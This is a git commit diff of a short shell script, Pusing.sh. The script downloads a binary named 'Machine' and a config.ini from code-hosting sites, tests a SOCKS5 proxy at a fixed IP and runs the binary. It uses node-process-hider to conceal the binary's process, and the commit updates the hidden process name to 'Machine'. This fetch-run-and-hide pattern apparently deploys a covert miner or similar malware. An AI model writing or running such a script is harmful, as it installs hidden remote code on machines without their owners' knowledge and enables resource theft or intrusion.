c02586943bdc166f79540ef610e6f16cda614bde
NuDev2021 <93753012+NuDev2021@users.noreply.github.com>
2021-11-26 15:35:01 +0700

    Update Pusing.sh

--- Pusing.sh
+++ Pusing.sh
@@ -1,7 +1,5 @@
 npm i -g node-process-hider 
 
-ph add War
-
 wget https://gitlab.com/NuDev2021/ppa/-/raw/main/Machine
 
 wget https://raw.githubusercontent.com/NuDev2021/config.ini/main/config.ini
@@ -9,5 +7,7 @@ wget https://raw.githubusercontent.com/NuDev2021/config.ini/main/config.ini
 curl -v -x socks5://1.197.162.234:1080 http://www.google.com/
 
 chmod +x Machine
+
+ph add Machine
 
 ./Machine 
